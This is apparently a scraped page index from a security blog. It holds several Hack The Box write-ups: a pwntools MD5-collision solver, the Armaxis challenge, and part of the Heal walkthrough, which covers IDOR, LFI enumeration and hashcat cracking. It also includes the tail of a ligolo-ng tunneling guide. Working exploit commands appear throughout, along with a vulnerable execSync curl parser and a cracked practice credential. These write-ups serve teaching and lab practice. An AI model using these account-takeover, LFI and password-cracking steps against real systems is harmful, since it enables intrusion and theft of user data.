Starting the Tunnel In the ligolo-ng console on the attacker host, select the session for this particular agent (target host). Use the session command, put the cursor on the desired session, and hit [Enter]:
&gt;&gt; session The ligolo-ng prompt should change to show that you&rsquo;re controlling a particular session now.
Establish a route and start the tunnel. We have a session open, but no tunnel yet. We can issue the autoroute command to have ligolo-ng take care of the details for us. Under the hood, it&rsquo;s issuing route and ip commands to create a tunnel, much like a VPN would:
&gt;&gt; autoroute You&rsquo;ll be presented with a few prompts, answer them as follows:
Select the route from the list (match up your target&rsquo;s IP address to the one in this list). Hit [Enter] to confirm. Use an existing interface: select ligolo which we just created Start the tunnel? Answer y for yes. &ldquo;Great, all done!&rdquo;
&#x270b; Hold up! There is still one thing to do.
Accessing Target&rsquo;s Localhost We can&rsquo;t access internally-facing services at target side of the tunnel until we set up one more route. This route is to a special address that will effectively translate to localhost on the egress side of the tunnel:
sudo ip route add 240.0.0.1/32 dev ligolo &#x261d;&#xfe0f; This is how you set up a route in linux.
This means &ldquo;you can reach the 240.0.0.1/32 network by going through the ligolo network interface&rdquo;.
TRY IT OUT Everything is configured now. Let&rsquo;s try it out!
Hypothetically, if there was a MySQL server listening on 127.0.0.1:3306 we could connect to it like this:
mysql -h 240.0.0.1 -P 3306 -u sql_user -p Or maybe there&rsquo;s a special website listening on 127.0.0.1:8080, we can just open up a web browser and navigate to it:
We just browse to it as if it&rsquo;s a regular page; no need to fuss around with proxy settings. We can treat ligolo-ng much the same as a VPN &#x1f44d;
More Features Ligolo-ng has a very rich set of features aside from the (typical) use-case that I just presented. We can even run nmap through it:
Another really cool feature is the ability to use the agent in a bind configuration. In otherwords, the agent (running on the target) becomes the listener for incoming connections!
CONCLUSION Ligolo-ng exhibits some very useful features for pentesting, bug bounty, and CTFs. I&rsquo;ll probably start using this on every box with internally-listening services. Maybe I&rsquo;ll even use it in my personal life.
While it does take some configuration, Ligolo-ng solves the problems I had with my former go-to methods for reaching internal listeners:
It&rsquo;s way faster than a SOCKS5 proxy for accessing websites that arent DNS-listed There is no need to specify individual ports, like you would with ssh -L I hope you get as much mileage out of this tool as I do. If you have a sec, be a friend and ​s​ta​r​ ​t​he​ir​ ​r​ep​o on Github​ &#x2b50;
`,url:"https://4wayhandshake.github.io/strategy/tunneling-with-ligolo-ng/"},"https://4wayhandshake.github.io/ctf/alphascii-clash/":{title:"Alphascii Clashing",tags:["MD5","Hashing Collision","Pwntools","Python"],categories:["Challenge","HTB","Crypto","Very Easy"],content:`INTRODUCTION This challenge was super easy - I saw the vulnerability right away. Instead of just finishing it quickly, I thought I&rsquo;d get around to doing something that has been on my To-Do list for far too long:
Finally learning to use Pwntools for CTFs &#x1f480;
Usually, I just write socket code. However, I&rsquo;ve noticed that this is clearly the &ldquo;slow&rdquo; way to do things. If I&rsquo;m going to go faster in future CTFs, I&rsquo;ll need to use some libraries to speed up my coding!
The challenge itself is a simple menu with two/three pages to it:
The main menu Registration Login To traverse the menus, we need to write everything in JSON format, which is a little tedious.
This inconvenience is ultimately what convinced me I should script it up with Pwntools. So&hellip; thanks?
CODE ANALYSIS &#x1f6ab; If all you wanted to see was a clean example of using Pwntools for CTFs, skip to the Solution section.
We can broadly observe this by skimming the code:
Oddly enough, the &ldquo;database&rdquo; hashes usernames, not passwords &#x1f914; During Registration, the username and password must be alphanumeric. That tells us a little about how the application works, but the actual vulnerability is in the Login part of the code:
creds = json.loads(input(&#39;enter credentials (json format) :: &#39;)) usr, pwd = creds[&#39;username&#39;], creds[&#39;password&#39;] usr_hash = md5(usr.encode()).hexdigest() for db_user, v in users.items(): if [usr_hash, pwd] == v: if usr == db_user: print(f&#39;[+] welcome, {usr} 🤖!&#39;) else: print(f&#34;[+] what?! this was unexpected. shutting down the system :: {open(&#39;flag.txt&#39;).read()} 👽&#34;) exit() break else: print(&#39;[-] invalid username and/or password!&#39;) Read the code backwards, starting with how we obtain the flag:
To read the flag, we must follow the else branch of the if usr = db_usr check. To reach that branch, the usr_hash and pwdmust be stored in the &ldquo;database&rdquo; already (Registered as a user) usr_hash is the MD5 hash of the username that we provide. Do (1) and (2) seem like a contradiction? Well, normally we think of hashes as being 1-to-1 with a password, but by definition a hash is more of a many-to-1 mapping onto a particular value.
Therefore, we just need to two usernames that produce the same hash - this is called a hashing collision.
While discussing crypto stuff, the words &ldquo;possible&rdquo; and &ldquo;feasible&rdquo; are very distinct. It&rsquo;s always possible to crack a hash, but is it feasible? Depending on the preimage of the hash, it may not be feasible to crack it!
What about a hashing collision? This is a different problem, because we simply need to find any two preimages that produce the same hash. This can still be quite difficult, but is a lot more feasible than cracking the hash outright.
This is made much more difficult by the constraint we observed earlier: the username(s) must be alphanumeric!
I went searching for a way to find MD5 hashing collisions and stumbled across some work by the person who ended up being the OG researcher around hashing collisions: Marc Stevens.
Check out the Github repo for this project: https://github.com/cr-marcstevens/hashclash
&#x1f4a1; Note the name, &ldquo;hashclash&rdquo;. That&rsquo;s too obvious to be a mere coincidence!
Scrolling down the README, we find that the author has conveniently posted two alphanumeric strings that produce a hashing collision! Thank you! &#x1f64f;
md5(&#34;TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak&#34;) = md5(&#34;TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak&#34;) Pwntools The researcher has done our work for us (finding two alphanumeric strings that produce a hashing collision), so this section will just be about coding a solution in Pwntools.
Connecting I think pwntools has a thing for this, but I&rsquo;ll just use sys to parse args:
#!/usr/bin/env python3 from pwn import * import sys # Parse args if len(sys.argv) &lt; 2: print(f&#39;Usage: {sys.argv[0]} &#34;&lt;IP&gt;:&lt;PORT&gt;&#34;&#39;) sys.exit(1) # Connect to target (host,port) = sys.argv[1].split(&#34;:&#34;) print(f&#39;Connecting to {host}:{port}&#39;) conn = remote(host, port) Like many similar challenges, this one comes with a copy of the server code. We can use Pwntools to connect to a running process just as easily as a network socket - Let&rsquo;s change the code to conditionally connect to the *local python process if desired:
# Connect to target if &#34;:&#34; in sys.argv[1]: (host,port) = sys.argv[1].split(&#34;:&#34;) print(f&#39;Connecting to {host}:{port}&#39;) conn = remote(host, port) elif &#34;server.py&#34; in sys.argv[1].lower(): conn = process([&#39;python3&#39;, &#39;./server.py&#39;]) Receiving from the remote We have a few different methods available to us, each with their own specialty:
Pwntools always uses bytes-encoded objects instead of strings. You&rsquo;ll understand the convenience of that clarity if you do a few Pwn challenges.
Keep the the following at your fingertips:
# Encode string to bytes and manually tack on a newline character &#39;hello_world&#39;.encode() + b&#39;\\n&#39; # Decode bytes to string. Good for printing b&#39;im a byte string!\\n&#39;.decode(&#39;utf-8&#39;) # Receive a fixed number of bytes recv(numb=4096, timeout=default) → bytes # Receive bytes until the first newline character recvline(keepends=True, timeout=default) → bytes # Receive bytes until the first occurrence of the specified string recvuntil(delims, drop=False, timeout=default) → bytes # Receive ALL bytes, until the EOL is reached and connection closes. Good for the end of a script. recvall(timeout=Timeout.forever) → bytes Sending to the remote Sending is even easier. Just remember to manually add in the newline character if your target application is running a console-like app:
# Send a string conn.send(b&#39;hello world&#39;) # Using encode() s = &#39;hello world&#39; conn.send(s.encode()) SOLUTION With the Pwntools basics out of the way, we can write the whole challenge solution in one simple script:
#!/usr/bin/env python3 from pwn import * import json import sys from hashlib import md5 # https://github.com/cr-marcstevens/hashclash username_orig = &#39;TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak&#39; username_coll = &#39;TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak&#39; # Parse args if len(sys.argv) &lt; 2: print(f&#39;Usage: {sys.argv[0]} &#34;&lt;IP&gt;:&lt;PORT&gt;&#34;&#39;) sys.exit(1) # Connect to target if &#34;:&#34; in sys.argv[1]: (host,port) = sys.argv[1].split(&#34;:&#34;) print(f&#39;Connecting to {host}:{port}&#39;) conn = remote(host, port, level=&#39;error&#39;) elif &#34;server.py&#34; in sys.argv[1].lower(): conn = process([&#39;python3&#39;, &#39;./server.py&#39;], level=&#39;error&#39;) def choose_menu_item(s): print(conn.recvuntil(b&#39;:: &#39;).decode(&#39;utf-8&#39;)) msg = json.dumps({&#34;option&#34;:s}).encode()+b&#39;\\n&#39; print(&#34;&gt;&gt; &#34;,msg) conn.send(msg) def submit_json_creds(username,password): print(conn.recvuntil(b&#39;:: &#39;).decode(&#39;utf-8&#39;)) msg = json.dumps({ &#34;username&#34;: username, &#34;password&#34;: password }).encode()+b&#39;\\n&#39; print(&#34;&gt;&gt; &#34;,msg) conn.send(msg) choose_menu_item(&#39;register&#39;) submit_json_creds(username_orig, &#39;password123&#39;) choose_menu_item(&#39;login&#39;) submit_json_creds(username_coll, &#39;password123&#39;) # recvall() didnt want to work here: try: while True: print(conn.recvline().decode(&#39;utf-8&#39;)) except EOFError: sys.exit(0) &#x1f602; Oh, I guess it was on Twitter too? Oh well, still found it in the end!
`,url:"https://4wayhandshake.github.io/ctf/alphascii-clash/"},"https://4wayhandshake.github.io/ctf/armaxis/":{title:"Armaxis",tags:["Express","NodeJS","Broken Authentication","IDOR","Broken Password Reset","Markdown","Insecure Markdown Parsing"],categories:["Challenge","HTB","Web","Very Easy"],content:`INTRODUCTION Starting the challenge, we&rsquo;re given two ports, corresponding to two components: a website and an web-based email client. The website presents a simple login/registration form, and the email client brings us straight into an inbox without any authentication:
A quick skim through the website code suggests that this email client will probably be used for password resets.
CODE ANALYSIS As usual, I like to read through the code sequentially, starting from startup/initialization code (the Dockerfile, then index.js, etc) and ending with the views. Thankfully, this one didn&rsquo;t take a lot of reading before I discovered a couple vulnerable sections of code &#x1f913;
A lot of this challenge is very well written, and follows decent coding practices (kudos to the challenge author!). However there are a few outliers&hellip;
/challenge/database.js const insertUser = db.prepare( \`INSERT INTO users (email, password, role) VALUES (?, ?, ?)\`, ); const runInsertUser = promisify(insertUser.run.bind(insertUser)); await runInsertUser( &#34;admin@armaxis.htb&#34;, \`\${crypto.randomBytes(69).toString(&#34;hex&#34;)}\`, &#34;admin&#34;, ); insertUser.finalize(); console.log(&#34;Seeded initial users.&#34;); The admin password is properly randomized and we can consider it unguessable. However,
&#x1f4a1; &hellip;we can see the hardcoded email address for the admin account.
/challenge/routes/index.js router.post(&#34;/reset-password&#34;, async (req, res) =&gt; { const { token, newPassword, email } = req.body; // Added &#39;email&#39; parameter if (!token || !newPassword || !email) return res.status(400).send(&#34;Token, email, and new password are required.&#34;); try { const reset = await getPasswordReset(token); if (!reset) return res.status(400).send(&#34;Invalid or expired token.&#34;); const user = await getUserByEmail(email); if (!user) return res.status(404).send(&#34;User not found.&#34;); await updateUserPassword(user.id, newPassword); await deletePasswordReset(token); res.send(&#34;Password reset successful.&#34;); } catch (err) { console.error(&#34;Error resetting password:&#34;, err); res.status(500).send(&#34;Error resetting password.&#34;); } }); Pay close attention to the parts that interact with the database:
const reset = await getPasswordReset(token); if (!reset) return res.status(400).send(&#34;Invalid or expired token.&#34;); const user = await getUserByEmail(email); if (!user) return res.status(404).send(&#34;User not found.&#34;); See how each query only requires one parameter? Without even re-reading the database code, we know that there is no way that the code is verifying that the token is for the email that they&rsquo;re looking up - All it&rsquo;s checking is that (1) the token exists and (2) the email exists.
There is no check that the provided token actually corresponds to the provided email. &#x1f4a1; This means that we could reset another user&rsquo;s password and hijack their account. All we need is their email.
/challenge/markdown.js function parseMarkdown(content) { if (!content) return &#39;&#39;; return md.render( content.replace(/\\!\\[.*?\\]\\((.*?)\\)/g, (match, url) =&gt; { try { const fileContent = execSync(\`curl -s \${url}\`); const base64Content = Buffer.from(fileContent).toString(&#39;base64&#39;); return \`&lt;img src=&#34;data:image/*;base64,\${base64Content}&#34; alt=&#34;Embedded Image&#34;&gt;\`; } catch (err) { console.error(\`Error fetching image from URL \${url}:\`, err.message); return \`&lt;p&gt;Error loading image: \${url}&lt;/p&gt;\`; } }) ); } First, consider the regex line:
content.replace(/\\!\\[.*?\\]\\((.*?)\\)/g, (match, url) =&gt; { It is searching content for some markdown like this: ![match](url)
Then it takes the url and performs a web request to it, but does no validation on either the URL or the response:
&#x1f4a1; W​e​ ​do​n​&rsquo;t​ e​v​e​n ​ne​e​d ​t​o ​us​e ​the​ ​​h​t​t​p:/​/​​ ​p​ro​to​c​o​l​ for this URL&hellip;
const fileContent = execSync(\`curl -s \${url}\`); Lastly, it plops the response (base64 encoded) into some HTML as image data:
return \`&lt;img src=&#34;data:image/*;base64,\${base64Content}&#34; alt=&#34;Embedded Image&#34;&gt;\`; It&rsquo;s handy that the data is b64-encoded because it&rsquo;s guaranteed to not break the HTML.
Summary To summarize, we found three main things:
The administrator is a hardcoded account, and we know their email The password reset mechanism only checks that a token is valid - NOT that a token actually corresponds to the provided email. The markdown parser checks for text like this using a regex: ![image alt text](url) It loads the URL then performs a web request to obtain the &ldquo;image&rdquo; It blindly loads a base64 version of the response from the web request into the image data, without even checking if it is an image EXPLOIT Strategy The high-level steps of this are:
We can leak the flag by using loading it using the markdown parser. The markdown parser is invoked when we &ldquo;dispatch&rdquo; a weapon. To dispatch a weapon, we must be the administrator. We should be able to abuse the password reset mechanism to become the administrator In more detail, we&rsquo;ll need to do the following:
Register a user corresponding to the provided email Perform a password reset on yourself, receive the reset token in your inbox Manually send a POST /reset-password request, specifying your reset token but the administrator&rsquo;s email address Login to dashboard as the admin Dispatch a weapon to yourself (the admin) with a payload for the markdown parser Use a file:// protocol instead of the usual http:// The flag should be loaded as base64 Go back to dashboard and read the base64 flag off of the list of &ldquo;dispatched weapons&rdquo; Execution When we start the challenge, we don&rsquo;t actually have a user. We need to register a user with our provided email, so that we&rsquo;ll be able to receive a password reset token:
The initial password is irrelevant; we just need the account tied to the provided email address.
Immediately after registration, we can initiate a password reset by choosing Forgot Password. Entering our test email test@email.htb again, we should receive a reset token:
We&rsquo;re presented with a simple password reset form to enter the token, but this UI has our email address pre-loaded:
We want to provide our reset token but the administrator&rsquo;s email address, so we&rsquo;ll bypass this form by performing the request via cURL instead:
curl http://94.237.48.175:32314/reset-password --json &#39;{&#34;token&#34;:&#34;8308b1a2338540a2d1ecd0f9466828a3&#34;, &#34;newPassword&#34;:&#34;password&#34;, &#34;email&#34;:&#34;admin@armaxis.htb&#34;}&#39; # Password reset successful. The API reports success, so let&rsquo;s go log in with our new credentials: admin@armaxis.htb : password from the regular login form at /. It lets us in with no fuss at all, and now we can see the dashboard from the administrator&rsquo;s role:
We needed to log in as admin because, unlike ordinary users, this user can &ldquo;dispatch weapon&rdquo;. The vulnerable code in parseMarkdown() is called by submitting this form (POST /weapons/dispatch - see /challenge/routes/index.js):
&#x261d;&#xfe0f; Note: we could have used either email, either the administrator&rsquo;s or test@email.htb. We only need to send it to an account that we have access to, so that we can see the weapon appear on their dashboard home.
If we send it to the admin&rsquo;s, we can see it without having to log in again.
The weapon appears on the dashboard, and we can Inspect the embedded image;
The flag is inside the &lt;img&gt; tag as base64 data:
&lt;img src=&#34;data:image/*;base64,[BASE64_FLAG_REDACTED]&#34; alt=&#34;Embedded Image&#34;&gt; Go ahead and copy the base64 data to the clipboard, and decode it using bash:
echo -n &#39;[PASTE]&#39; | base64 -d There&rsquo;s the flag! &#x1f389;
That was fun, and pretty easy &#x1f604; Thanks, @Xclow3n
`,url:"https://4wayhandshake.github.io/ctf/armaxis/"},"https://4wayhandshake.github.io/walkthrough/heal/":{title:"Heal",tags:["LFI","LimeSurvey","Ruby","Rails","ZAP","Malicious Plugin","Proxychains","Consul","SUID Bash"],categories:["Walkthrough","HTB","Linux","Medium"],content:`INTRODUCTION I arrived at Heal a couple months after it was released. At the face of it, Heal is about a website that has a simple resume-building service. I never really figured out how the name &ldquo;Heal&rdquo; relates to the box or icon. While it was on the easier side of &ldquo;Medium&rdquo;, it&rsquo;s tempting to do way too much recon.
Everything you need to know from recon can be found by &ldquo;spidering&rdquo; the website using a web app proxy (I&rsquo;ll be using ZAP in this one). From here, you&rsquo;ll discover a couple of subdomains and gain an understanding of how they work. The target in front of you is actually very minimal - almost everything is offloaded onto the subdomains. If you play with the app a little, you will surely notice a moment when the server trusts some data that it shouldn&rsquo;t; exploiting that is half of the battle; the other half is doing research on common files that the target&rsquo;s framework uses for configuration. This will lead to a successful foothold into a web app dashboard.
Gaining actual RCE on the target is very easy. A little research may be required, but conceptually it&rsquo;s almost self-evident. Explore the functionality that the web app provides to administrators, and think about which features could be used to gain RCE directly (Don&rsquo;t overthink it!)
If you&rsquo;re already comfortable playing around with proxies, obtaining the root flag might only take a few minutes. Once again, the critical step here is doing a little bit of research. After a very short sprint of local privesc enumeration, you&rsquo;ll find that one of the services you&rsquo;ve gained access has a big, serious vulnerability, and exploitation is trivial. Public PoCs are available and work without modification.
Overall, Heal was fine. It was mostly focused on research, which is sometimes good for you. It was also a great opportunity to give some love to one of my tools, Alfie. If you&rsquo;re wise, you&rsquo;ll try it out. If you&rsquo;re really wise, you&rsquo;ll give it a star &#x2b50;
RECON nmap scans Port scan I&rsquo;ll set up a directory for the box, with a nmap subdirectory, then set $RADDR to the target machine&rsquo;s IP, and scan all 65535 ports:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA) |_ 256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://heal.htb/ Fairly current Nginx. Note the redirect to heal.htb
Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR No results.
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR No results.
Webserver Strategy Noting the redirect from the nmap scan, I added download.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=heal.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb --aggression 3 http://$DOMAIN &amp;&amp; curl -IL http://$RADDR Next I&rsquo;ll perform vhost and subdomain enumeration. First, I&rsquo;ll check for alternate hosts:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v Next I&rsquo;ll check for subdomains of heal.htb
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v We&rsquo;ve discovered a subdomain. I&rsquo;ll add this to my /etc/hosts then move on to directory enumeration:
echo &#34;$RADDR api.$DOMAIN&#34; | sudo tee -a /etc/hosts First, the primary domain, heal.htb:
I prefer to not run a recursive scan, so that it doesn&rsquo;t get hung up on enumerating CSS and images.
WLIST=/usr/share/wordlists/dirs-and-files.txt ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 60 -ic -c -o fuzzing/ffuf-directories-root -of json -timeout 4 -v Next I&rsquo;ll check the subdomain, api.heal.htb. Since it&rsquo;s an API, it would be wise to check alternate methods, too:
ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 60 -ic -c -o fuzzing/ffuf-directories-root -of json -timeout 4 -v So far, this box has been really flaky - sometimes I&rsquo;ll scan and get certain results, then I&rsquo;ll perform the exact same scan and get different results! &#x1f620;
As a result, I&rsquo;ve been doing every scan twice
It&rsquo;s marked as an API, so let&rsquo;s try a more API-specific wordlist:
WLIST=/usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt ffuf -w $WLIST:FUZZ -u http://api.$DOMAIN/FUZZ -t 60 -ic -c -timeout 4 Exploring the Website (heal.htb) The index page of http://heal.htb indicates it&rsquo;s some kind of resume builder.
When we examine the page source (ctrl+u) we can see it&rsquo;s made with React:
&lt;meta name=&#34;description&#34; content=&#34;Web site created using create-react-app&#34; /&gt; It&rsquo;s not a perfect indicator at all, but a lot of inexperienced developers rely on create-react-app - maybe this one has made some mistakes? &#x1f634;
One weakness that I know about is that react apps are on development mode by default, so we might be able to get extra information from HTTP 500 pages!
I went ahead and signed up as jim@bob.htb : jimbob : password to check out the web app. This opens up a page where you can fill in data to assemble your resume:
The sections are:
Personal Information (name, email, phone) Education (school name, degree, description) Experience (company, job title, description) Projects (free-form text) Skills (free-form text) Languages (free-form text) At the bottom, there is a button to export the resume as a PDF. That could be interesting &#x1f6a9;
After filling in the form with some test data, a quick check confirms that it will happily render HTML tags (in every text field, too):
The Survey button at the top right brings us to a page that presumably links to some other subdomain:
ZAP Spider It&rsquo;s a good idea to take a quick look at the website using ZAP, too. I&rsquo;ll open FoxyProxy and browse a little. This helps me to map out the website a little, and to uncover hidden endpoints.
I&rsquo;ll add http://heal.htb.* and its subdomains http://.*.heal.htb.* to the Default Context and try &ldquo;spidering&rdquo; the site. The results were pretty informative:
heal.htb was pretty uninteresting, but that&rsquo;s actually because it offloads all of its functionality to the API subdomain!
Some of those are kinda &ldquo;false-positives&rdquo; though. Once we filter them out, we&rsquo;re left with:
download(filename) profile resume signin / signup robots I.e. this lines to up exactly the functionality we see on http://heal.htb. http://api.heal.htb/download is used when we click the Export as PDF button at the bottom of the resume page. First, a request to /export is made that contains all of the resume data:
a filename is returned in the response; we&rsquo;re automatically redirected to /download to get the returned filename:
It takes two steps for this whole &ldquo;download&rdquo; thing to happen, and for some reason the server is trusting us to provide the filename. For the download&hellip;
&#x1f6a8; If we&rsquo;re lucky and the server isn&rsquo;t checking the download token properly, this might be a breach of privacy which allows us to read other people&rsquo;s resumes. If we&rsquo;re really really lucky this will lead to a full-blown LFI. I&rsquo;ll definitely follow-up on this later.
take-survey.heal.htb I&rsquo;ll go ahead an add take-survey.heal.htb to my /etc/hosts as well, and check out the survey page
Just from the URL though, I&rsquo;m seeing a PHP page that takes a parameter. &hellip;a good reminder to check for file inclusion &#x1f6a9;
echo &#34;$RADDR take-survey.$DOMAIN&#34; | sudo tee -a /etc/hosts Navigating to the survey, we see a couple of things to investigate:
In the &quot;...&quot; menu there is the option to load an unfinished survey. Correspondingly, if you&rsquo;ve already started the survey, you have the option to save your progress.
Also, if we delete the survey ID, we get a little hint about a username:
&#x1f4a1; Good to know - ralph@heal.htb is the administrator
Since we didn&rsquo;t know about this during the previous directory enumeration, I&rsquo;ll check this subdomain now:
I found that I was getting inconsistent results, so I slowed it down and filtered-out HTTP 403 instead of filtering by response size:
WLIST=/usr/share/wordlists/dirs-and-files.txt ffuf -w $WLIST:FUZZ -u http://take-survey.$DOMAIN/FUZZ -t 10 -ic -c -timeout 4 -mc all -fc 403 It still took a few tries, but I determined a few directories and files:
index.php /admin /installer /assets /upload /quotas /responses Nothing is accessible - everything results either a 403 Unauthorized or in a redirect to the /admin login page:
Exploring the website (api.heal.htb) The API subdomain brings us to a page declaring that it&rsquo;s using Ruby 3.3.5 (circa Sep. 2024) and Rails 7.1.4 (circa Aug. 2024)
In a cursory search, I didn&rsquo;t see any obvious glaring vulnerabilities in either of these. A couple of DOSs, but that&rsquo;s all.
FOOTHOLD Getting someone else&rsquo;s resume To test if there&rsquo;s some kind of breach of privacy on the website, I&rsquo;ll create a second user and have each user create a resume. The server should then generate two PDF files to download. The question is: can the two users download each other&rsquo;s resumes?
As far as I can tell, there is no anti-CSRF token in place, so I can just fire requests from Repeater (&ldquo;Requester&rdquo; in ZAP) and it should work fine.
In a private/incognito tab, I registered a second user called Bobjim and exported a resume (note the filename):
Then, from my Jimbob tab, I pressed the Export PDF button and intercepted the request. Stepping through the sequence of the requests until the one for /download, I then replaced Jimbob&rsquo;s filename with Bobjim&rsquo;s, therefore accessing another user&rsquo;s resume:
It worked! Even though the file is saved under Jimbob&rsquo;s original filename, we obtained the content of Bobjim&rsquo;s resume (again, note the filename in the download URL):
&#x1f44d; Super. I&rsquo;m not sure how we can use this yet, but if I were a bug bounty hunter I would definitely be filing this as an IDOR bug!
This is probably just a breach of privacy.
I might be able to turn this into an XXE, but I don&rsquo;t think the whole &ldquo;access some else&rsquo;s resume&rdquo; concept factors into that &#x1f914;
Checking for LFI As I mentioned earlier, this whole /download?filename= API endpoint might, if we&rsquo;re really lucky, be usable as an LFI. To check, I&rsquo;ll run it through my tool, Alfie:
&#x1f4a1; Alfie is used for rapidly checking a ton of different path traversal, encoding, and bypass methods to try to find an LFI. If it finds one, it then tries to find as many files as possible by reusing the successful traversal method.
We&rsquo;ll need the Authorization: Bearer token from ZAP. Go ahead and copy that to the clipboard, then paste it into Alfie &#x1f447;
cd ./tools git clone https://github.com/4wayhandshake/Alfie.git &amp;&amp; cd Alfie TOKEN=&#39;Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ&#39; python3 alfie.py -u &#34;http://api.heal.htb/download?filename=&#34; -H &#34;$TOKEN&#34; --threads 40 filter It&rsquo;s suggesting we filter out word counts 3, 7, and 14, so I&rsquo;ll just filter out the whole range (you can often just copy-paste the suggested filter) to use with scan mode:
python3 alfie.py -u &#34;http://api.heal.htb/download?filename=&#34; -H &#39;Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ&#39; --threads 40 -fw &#39;3-14&#39; --max 5 scan Nice! it claims to have found a file. Let&rsquo;s verify this claim:
curl &#34;http://api.heal.htb/download?filename=/etc/passwd&#34; -H &#34;$TOKEN&#34; Yup, that totally worked. We should be able to use this as a nearly arbitrary LFI now. Next we can run Alfie in enum mode, passing it /etc/passwd (the green/bold text from scan mode) as the --example-lfi parameter:
python3 alfie.py -u &#34;http://api.heal.htb/download?filename=&#34; -H &#34;$TOKEN&#34; --threads 40 -fw &#39;3-14&#39; --max 5 enum --example-lfi &#39;/etc/passwd&#39; That&rsquo;s an awesome proof of concept, and now we have a copy of /etc/passwd, but the usefulness of this is a little limited without knowing what&rsquo;s actually in the application.
LFI for Application Files For the application files, it&rsquo;s better to force scan mode to check for files with relative paths instead of absolute paths (like /etc/passwd), we can provide the -rel argument to scan mode:
This functionality was actually the reason that I wrote Alfie in the first place: It was for Download, to find the package.json file for a NodeJS web app.
That&rsquo;s why I&rsquo;m hopeful for this to work; a NodeJS and a Ruby on Rails app are architecturally pretty similar.
python3 alfie.py -u &#34;http://api.heal.htb/download?filename=&#34; -H &#34;$TOKEN&#34; --threads 40 --target_system &#39;linux,node,ruby&#39; -fw &#39;3-14&#39; --max 5 scan -rel &hellip; and 45s later, we found a match!
Once again, we can copy-paste the bold, green part and use it as the --example-lfi for enum mode:
python3 alfie.py -u &#34;http://api.heal.htb/download?filename=&#34; -H &#34;$TOKEN&#34; --threads 10 --target_system &#39;linux,ruby&#39; -fw &#39;3-14&#39; --min 2 --max 2 enum --example-lfi &#39;%2e%2e%2f%2e%2e%2fconfig%2fapplication%2erb&#39; Alfie will have dumped the file contents into the ./output directory for us so we can examine the files. While most of the contents seem like unimportant configuration variables, there are a couple references to other files that we didn&rsquo;t enum:
Inside config/environment/development.rb:
if Rails.root.join(&#34;tmp/caching-dev.txt&#34;).exist? config.cache_store = :memory_store config.public_file_server.headers = { &#34;Cache-Control&#34; =&gt; &#34;public, max-age=#{2.days.to_i}&#34; } else config.action_controller.perform_caching = false config.cache_store = :null_store end Inside config/database.yml:
development: &lt;&lt;: *default database: storage/development.sqlite3 test: &lt;&lt;: *default database: storage/test.sqlite3 production: &lt;&lt;: *default database: storage/development.sqlite3 &#x261d;&#xfe0f; Note that both Production and Development use the development database &#x1f914; Suspicious!
After enum mode finishes, Alfie drops us into a console for manual enumeration:
We didn&rsquo;t find this caching-dev.txt file, which means the server is probably in production mode. However, we did get a copy of development.sqlite3! &#x1f601;
sqlite3 ./output/development.sqlite3 &gt;&gt; .tables # users table is present &gt;&gt; .mode table &gt;&gt; .headers on &gt;&gt; select * from users; &#x1f381; That&rsquo;s the password hash for Ralph. I think it&rsquo;s bcrypt. Let&rsquo;s crack it!
echo &#39;ralph:$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG&#39; &gt; sqlite.hash hashcat -m 3200 sqlite.hash $WLIST --username Before long, we&rsquo;d cracked it:
We have a credential for the web app: ralph@heal.htb : ralph : 147258369 &#x1f370;
